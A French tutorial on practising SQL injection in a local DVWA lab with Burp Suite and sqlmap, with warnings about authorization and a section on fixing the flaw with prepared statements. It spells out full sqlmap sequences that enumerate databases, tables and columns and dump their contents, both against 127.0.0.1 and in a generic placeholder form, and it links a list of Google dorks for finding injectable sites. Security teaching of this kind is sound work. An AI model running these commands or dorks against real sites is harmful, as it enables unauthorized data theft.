# Injection SQL — apprendre dans un laboratoire

L’injection SQL survient lorsqu’une application assemble une requête SQL avec des données utilisateur sans utiliser de requêtes préparées. Cette note explique comment mettre en place un laboratoire local et comment vérifier un correctif sans viser un site tiers.

> **Règle absolue :** les commandes de test ci-dessous sont réservées à une application locale ou à une cible pour laquelle vous possédez une autorisation écrite. N’utilisez jamais l’URL d’un site public choisi au hasard.

## Prérequis

- VirtualBox ou une autre solution de virtualisation ;
- une machine Kali ou Debian de laboratoire ;
- DVWA ou WebGoat installé localement ;
- SQLmap et Burp Suite Community pour observer les requêtes ;
- un instantané de la machine avant les exercices.

## Installation des outils sous Kali ou Debian

```bash
sudo apt update
sudo apt install sqlmap burpsuite
sqlmap --version
```

Pour DVWA, utilisez sa documentation officielle et configurez-le sur `127.0.0.1` ou dans un réseau privé hôte. Ne rendez pas l’application accessible depuis Internet.

## Comprendre le problème

Une application vulnérable concatène parfois une valeur utilisateur dans une requête. La correction consiste à utiliser :

- des requêtes préparées ;
- des paramètres typés ;
- un compte de base de données avec les droits minimum ;
- une validation côté serveur ;
- des messages d’erreur qui ne révèlent pas le schéma SQL.

## Utiliser Burp Suite dans le lab

1. Démarrer Burp Suite.
2. Configurer le navigateur de test pour utiliser le proxy local de Burp.
3. Intercepter une requête vers l’application locale.
4. Observer les paramètres et la réponse.
5. Rejouer uniquement une requête de test sur `127.0.0.1`.
6. Corriger l’application puis comparer le comportement.

## Utiliser SQLmap avec une URL locale

L’exemple suivant ne doit être adapté qu’à une application de laboratoire que vous contrôlez :

```bash
sqlmap -u "http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --batch --level=1 --risk=1
```

Commencez par une vérification minimale. Évitez toute option destructive et ne demandez pas d’extraction de données réelles. Le but est d’identifier le défaut puis de confirmer que le correctif le bloque.

Afficher l’aide locale :

```bash
sqlmap --help
```

## Séquence complète dans DVWA local

Les commandes suivantes reprennent la progression de la note originale. Elles utilisent exclusivement l’instance DVWA locale. Remplacez uniquement le chemin si votre installation de laboratoire est différente ; ne remplacez pas `127.0.0.1` par un site public.

### 1. Rechercher les bases visibles

```bash
sqlmap -u "http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --dbs --batch --level=1 --risk=1
```

### 2. Lister les tables d’une base de test

```bash
sqlmap -u "http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" -D dvwa --tables --batch --level=1 --risk=1
```

### 3. Lister les colonnes d’une table de test

```bash
sqlmap -u "http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" -D dvwa -T users --columns --batch --level=1 --risk=1
```

### 4. Exporter uniquement les données synthétiques du lab

```bash
sqlmap -u "http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" -D dvwa -T users --dump --batch --level=1 --risk=1
```

Cette dernière commande peut afficher les comptes de démonstration créés par DVWA. N’utilisez jamais `--dump` sur une base réelle ou sur une cible dont vous n’êtes pas responsable.

## Procédure en quatre commandes — syntaxe générique

Cette version reprend la séquence originale avec la syntaxe correcte de SQLmap. Elle ne doit être utilisée que sur une application de laboratoire ou sur une cible couverte par une autorisation écrite. Dans les exemples, remplacez `URL_AUTORISEE`, `NOM_BASE`, `NOM_TABLE` et `colonne1,colonne2` uniquement par des valeurs de votre environnement de test.

### Première commande — lister les bases disponibles

```bash
sudo sqlmap -u "URL_AUTORISEE" --dbs
```

Cette commande demande la liste des bases visibles par l’application vulnérable. Faites attention aux bases système ou par défaut : dans un exercice, ne sélectionnez pas une base qui ne fait pas partie de votre environnement de test.

### Deuxième commande — lister les tables d’une base choisie

```bash
sudo sqlmap -u "URL_AUTORISEE" -D "NOM_BASE" --tables
```

`-D` désigne la base de données choisie. La forme `--NOM_BASE` parfois utilisée dans des notes anciennes n’est pas la syntaxe correcte de SQLmap.

### Troisième commande — lister les colonnes d’une table choisie

```bash
sudo sqlmap -u "URL_AUTORISEE" -D "NOM_BASE" -T "NOM_TABLE" --columns
```

`-T` désigne la table à examiner. Si l’application possède plusieurs schémas ou beaucoup de répertoires, répétez cette étape uniquement pour les tables de votre base de laboratoire.

### Quatrième commande — exporter des colonnes de données de test

```bash
sudo sqlmap -u "URL_AUTORISEE" -D "NOM_BASE" -T "NOM_TABLE" -C "colonne1,colonne2" --dump
```

`-C` permet de limiter l’export aux colonnes indiquées. Dans un lab, utilisez uniquement des données synthétiques. Ne cherchez pas à récupérer des mots de passe, e-mails ou identifiants appartenant à des personnes réelles.

Si une application de laboratoire possède plusieurs tables pertinentes, reprenez la troisième puis la quatrième étape pour chaque table autorisée. Cela ne signifie pas qu’il faut sélectionner ou extraire les bases par défaut du serveur.

## Correction et vérification

Après avoir remplacé la concaténation par une requête préparée :

1. répéter le même test sur l’application locale ;
2. vérifier que l’entrée est traitée comme une valeur et non comme du SQL ;
3. contrôler les journaux ;
4. ajouter un test automatisé de non-régression.

## Vidéos et ressources présentes dans le projet

- [SQLmap — introduction](https://www.youtube.com/watch?v=CoiA-6qhzvE)
- [SQLmap — exemple](https://www.youtube.com/watch?v=fbt50vQfWZg)
- [DVWA — niveau débutant](https://www.youtube.com/watch?v=ex4003kemTc&list=PLdZk2ypV8xBGn_KjnGWODTAm4iNBoNrtK&index=2)
- [Burp Suite — introduction](https://www.youtube.com/watch?v=dbfciJsFJIA)
- [Burp Suite — tutoriel complet](https://www.youtube.com/watch?v=fpx1fjBI-uI)
- [Burp Suite — niveau avancé](https://www.youtube.com/watch?v=KWOs0Waq2TM&t=742s)
- [Burp Suite — exemples contrôlés](https://www.youtube.com/watch?v=1sYa65LsL94)
- [Google Dorks SQLi — ressource d’étude](https://github.com/Proviesec/google-dorks/blob/main/google-dorks-for-sql-injection.txt)
